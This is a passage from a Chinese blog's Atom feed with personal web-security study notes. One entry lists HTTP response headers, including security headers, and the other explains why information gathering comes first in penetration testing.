        <content type="html">&lt;!-- build time:Sun Feb 07 2021 00:32:46 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;h2 id=&#34;1-响应报文格式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-响应报文格式&#34;&gt;#&lt;/a&gt; （1）、响应报文格式：&lt;/h2&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&amp;lt;version&amp;gt;&amp;lt;status&amp;gt;&amp;lt;reason-phrase&amp;gt;&lt;br&gt;&amp;lt;headers&amp;gt;&lt;br&gt;&amp;lt;entity-body&amp;gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;h2 id=&#34;2-响应头报文&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-响应头报文&#34;&gt;#&lt;/a&gt; （2）、响应头报文：&lt;/h2&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Accept-Ranges&lt;br&gt;表明服务器是否支持指定范围请求及哪种类型的分段请求&lt;br&gt;Accept-Ranges: bytes&lt;/p&gt;&lt;p&gt;Access-Control-Allow-Origin&lt;br&gt;配置有权限访问资源的域&lt;br&gt;Access-Control-Allow-Origin: &amp;lt;origin&amp;gt;|*&lt;/p&gt;&lt;p&gt;Allow&lt;br&gt;对某网络资源的有效的请求行为，不允许则返回 405&lt;br&gt;Allow: GET, HEAD&lt;/p&gt;&lt;p&gt;Cache-Control&lt;br&gt;告诉所有的缓存机制是否可以缓存及哪种类型&lt;br&gt;Cache-Control: no-cache&lt;/p&gt;&lt;p&gt;Content-Encoding&lt;br&gt;web 服务器支持的返回内容压缩编码类型。&lt;br&gt;Content-Encoding: gzip&lt;/p&gt;&lt;p&gt;Content-Language&lt;br&gt;响应体的语言&lt;br&gt;Content-Language: en,zh&lt;/p&gt;&lt;p&gt;Content-Length&lt;br&gt;响应体的长度&lt;br&gt;Content-Length: 348&lt;/p&gt;&lt;p&gt;Content-Location&lt;br&gt;请求资源可替代的备用的另一地址&lt;br&gt;Content-Location: /index.htm&lt;/p&gt;&lt;p&gt;Content-Type&lt;br&gt;返回内容的 MIME 类型&lt;br&gt;Content-Type: text/html; charset=utf-8&lt;/p&gt;&lt;p&gt;Date&lt;br&gt;原始服务器消息发出的时间&lt;br&gt;Date: Tue, 15 Nov 2010 08:12:31 GMT&lt;/p&gt;&lt;p&gt;ETag&lt;br&gt;请求变量的实体标签的当前值&lt;br&gt;ETag: &amp;quot;737060cd8c284d8af7ad3082f209582d&amp;quot;&lt;/p&gt;&lt;p&gt;Location&lt;br&gt;用来重定向接收方到非请求 URL 的位置来完成请求或标识新的资源&lt;br&gt;Location: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy56Y21oaS5jb20vYXJjaGl2ZXMvOTQuaHRtbA==&#34;&gt;http://www.zcmhi.com/archives/94.html&lt;/span&gt;&lt;/p&gt;&lt;p&gt;Proxy-Authenticate&lt;br&gt;它指出认证方案和可应用到代理的该 URL 上的参数&lt;br&gt;Proxy-Authenticate: Basic&lt;/p&gt;&lt;p&gt;Refresh&lt;br&gt;应用于重定向或一个新的资源被创造，在 5 秒之后重定向（由网景提出，被大部分浏览器支持）&lt;br&gt;Refresh: 5; url=http://www.zcmhi.com/archives/94.html&lt;/p&gt;&lt;p&gt;Server&lt;br&gt;web 服务器软件名称&lt;br&gt;Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)&lt;/p&gt;&lt;p&gt;Set-Cookie&lt;br&gt;设置 Http Cookie Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1&lt;/p&gt;&lt;p&gt;Strict-Transport-Security&lt;br&gt;设置浏览器强制使用 HTTPS 访问&lt;br&gt;max-age: x 秒的时间内 访问对应域名都使用 HTTPS 请求&lt;br&gt;includeSubDomains: 网站的子域名也启用规则&lt;br&gt;Strict-Transport-Security: max-age=1000; includeSubDomains&lt;/p&gt;&lt;p&gt;X-Frame-Options&lt;br&gt;配置页面是否能出现在 &amp;lt;frame&amp;gt;, &amp;lt;iframe&amp;gt;, &amp;lt;embed&amp;gt;, &amp;lt;object&amp;gt; 等标签中，防止点击劫持&lt;br&gt;X-Frame-Options: deny&lt;br&gt;SAMEORGIN：仅同源域名下的页面匹配时许可&lt;/p&gt;&lt;p&gt;X-XSS-Protection&lt;br&gt;配置 XSS 防护机制&lt;br&gt;X-XSS-Protection: 1; mode=block&lt;/p&gt;&lt;p&gt;HttpOnly：使 JavaScript 脚本无法获取 cookie，防止 xss 攻击。&lt;/p&gt;&lt;p&gt;X-Powered-By：可以知道 web 后端语言（但是可以修改）&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="WEB安全知识" scheme="http://avenue.cool/categories/WEB/" />
        <category term="WEB基础知识" scheme="http://avenue.cool/categories/WEB/Web-Foundation/" />
        <category term="WEB基础知识" scheme="http://avenue.cool/tags/WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" />
        <updated>2020-09-06T02:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/WEB/Information-Gathering/1.%20%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
        <title>1. 为什么要进行信息收集</title>
        <link rel="alternate" href="http://avenue.cool/WEB/Information-Gathering/1.%20%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
        <content type="html">&lt;!-- build time:Sun Feb 07 2021 00:32:46 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;p&gt;在进行渗透测试之前，最重要的一步就是信息收集，在这个阶段，我们要尽可能的去搜集目标组织的信息。我们越是了解测试目标，测试的工作就越容易，在信息收集中，最重要的是收集服务器的配置信息和网站的敏感信息，其中包括域名和子域名信息，目标网站系统，CMS 指纹，目标网站真实 IP，开放的端口等，换句话说，只要是与目标网站相关的信息，我们都应该尽量收集。&lt;/p&gt;&lt;p&gt;&amp;quot;只有不努力的黑客，没有攻不破的系统&amp;quot;。&lt;br&gt;在 SRC 漏洞挖掘或渗透测试中，信息收集占很大一部分，能收集到别人收集不到的资产，就能挖到别人挖不到的洞。&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="WEB安全知识" scheme="http://avenue.cool/categories/WEB/" />
        <category term="信息收集" scheme="http://avenue.cool/categories/WEB/Information-Gathering/" />
        <category term="信息收集" scheme="http://avenue.cool/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" />
        <updated>2020-09-06T02:30:59.000Z</updated>
    </entry>
</feed>
